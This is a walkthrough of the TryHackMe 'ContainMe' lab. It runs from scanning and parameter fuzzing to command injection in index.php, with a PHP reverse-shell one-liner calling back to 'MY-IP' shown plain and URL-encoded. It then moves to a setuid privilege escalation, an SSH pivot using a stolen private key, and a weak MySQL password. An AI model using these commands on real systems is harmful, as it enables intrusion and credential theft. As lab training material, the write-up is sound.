# [ContainMe (TryHackMe)](https://tryhackme.com/room/containme1)

First, let's scan this thing: 

<code>rustscan -a 10.10.163.146</code>

![PIC_RUST](https://user-images.githubusercontent.com/93183445/141817607-4bf1e9a5-bb79-4117-9c40-a9a2a173efb0.png)

After that, just to be sure, nmap follows: 

<code>nmap -sV -sC -p22,80,2222,8022 10.10.163.146</code>

![PIC_NMAP](https://user-images.githubusercontent.com/93183445/141818585-cd585f86-3984-4137-a29e-c19ffebfc1a3.png)

Let's go after some directories (I added the "-t5" option at the end, because I got a lot of errors): 

<code>feroxbuster --url http://10.10.163.146 -w /usr/share/wordlists/dirb/common.txt -t 5</code>

![PIC_FEROX](https://user-images.githubusercontent.com/93183445/141819090-47390871-02a1-47e9-87e5-7a678fe70824.png)

The index.php shows a directory listing. Let's look at the source.

![PIC_INDEX_1](https://user-images.githubusercontent.com/93183445/141818220-71e224fc-9695-4f2c-bc05-f4efb6375f05.png)

Looks like we're going to search for the path. At this point I try to keep in mind that this 
box is marked as "easy"... Let's go for it!!

Tried a few things, but didn't find anything with directory bruteforcing. Maybe it is a parameter?

<code>ffuf -u http://10.10.163.146/index.php?FUZZ=a -w /usr/share/wordlists/dirb/common.txt</code>

This command spat out an incredible amount of responses. All with status 200. But they all had the same response
size. Let's filter that out and see what happens:

<code>ffuf -u http://10.10.163.146/index.php?FUZZ=a -w /usr/share/wordlists/dirb/common.txt -fs 329</code>

The outcome was:\
<code>path                    [Status: 200, Size: 79, Words: 9, Lines: 11]</code>

So we found the path.
As we could view the directory listing earlier and this is a box marked as easy, I tried simple rce
like id, whoami and so on. Nothing seemed to work.
The only thing that gave something back, was `ls` and `pwd`
(with backticks). So just the directory listing is enabled, it seems.\
So why not try "/"? Bingo..\
I'm able to see the directory listing of "/".\
With this opportunity given, I wanted to take a look in the home directory.\
So I found mike.

![PIC_MIKE](https://user-images.githubusercontent.com/93183445/141819141-6e26bff1-fa75-4ce1-9dd8-cb29e4da2a47.png)

But mike wasn't of great use, since I couldn't read or list the content of ".ssh/".

Still reminding me that this is a box marked as "easy", I tried command injection. With success:

![PIC_WHOAMI](https://user-images.githubusercontent.com/93183445/141819181-05119d8a-1653-4fed-bb16-85babe95f8df.png)

It took me a few tries just to end up using php and url-encoding anfter I wasn't able to netcat or wget anything.\
Again, https://www.revshells.com to the rescue :)

<code>php -r '$sock=fsockopen("MY-IP",9001);exec("sh <&3 >&3 2>&3");'</code>\
Urlencoded we get:\
<code>php%20-r%20%27%24sock%3Dfsockopen%28%22MY-IP%22%2C9001%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27</code>

Add this to the URL in the browser after starting a listener, and we get a callback :)

![PIC_CALLBACK](https://user-images.githubusercontent.com/93183445/141820541-5533b0a1-1f27-4561-9500-106cb802d846.png)

Stabilize the shell with python3:\
<code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>

Then check mike's home directory (remember the .ssh/ folder from before).\
But we get a "Permission denied". We're still www-data. But there's a binary file we are allowed to execute.\
Let's do that. Nothing happens. Except the fancy output telling us "CRYPTSHELL"..\
Again, trying to keep in mind this being a simple box, I append "mike" for the execution of the binary.\
This time, it took a few seconds to respond, so there's clearly something going on..\
Time for a search after files we are able to execute:

![PIC_CRYPT_1](https://user-images.githubusercontent.com/93183445/141819398-ead3d135-c25a-4df7-a6a2-c852c9080f5d.png)

Looks like we found something interesting..

![PIC_CRYPT_2](https://user-images.githubusercontent.com/93183445/141819430-cf877c52-1037-4575-8211-482a5e729231.png)

Trying the same again with this binary, things take an interesting turn:

![PIC_CRYPT_3](https://user-images.githubusercontent.com/93183445/141819452-30f55aaa-1464-4f43-90d6-d4c042520acd.png)

Welcome to the root-fest :).\
But no luck, the root directory is pretty much empty..\
The hostname is "host1", so maybe there's a number2?\

The following just didn't work somehow..

<code>for i in {1..254} ;do (ping -c 1 172.16.20.$i | grep "bytes from" &) ;done</code>

I mean to some degree, because before it went on telling me
that "Destination Host Unreachable". But inbetween the errors, I saw that 172.16.20.6 was up.\
So I had to stop the loop and reconnect.\
Note to self: *Better use the static nmap next time..* 

Then, the first thing I tried was to connect with the id_rsa from mikes home directory to the newly
found host (still kept in mind this is an easy box..):

<code>ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.6</code>

Aaaaand we're in :)

![PIC_HOST_2](https://user-images.githubusercontent.com/93183445/141819577-4c41309d-254b-49ec-9976-188f752d0148.png)

After searching around a bit, I got to the services. And there it was: port 3306

![PIC_NETSTAT](https://user-images.githubusercontent.com/93183445/141819600-9a0629dd-87ad-463b-bcd1-ac2c7f00ca93.png)

Taking a look at /etc/passwd revealed that there's no other user than mike. So let's get into the database.
It has to be good for something at least..

I tried to login a few times keeping the passwords rather simple. Then I succeeded with:

<code>mysql -umike -ppassword</code> 

Working my way towards the contents of the database gave me the things I needed in the end :) 

![PIC_DATABASE_2](https://user-images.githubusercontent.com/93183445/141819643-05927619-7c95-4e58-ba0a-388538059103.png)

Or at least, I thought so.. (sigh). Still no root flag. 
BUT: 

![PIC_ROOT](https://user-images.githubusercontent.com/93183445/141819661-c219d315-0011-4f31-a6bf-b00a5fff87cc.png)

**Thanks :)**












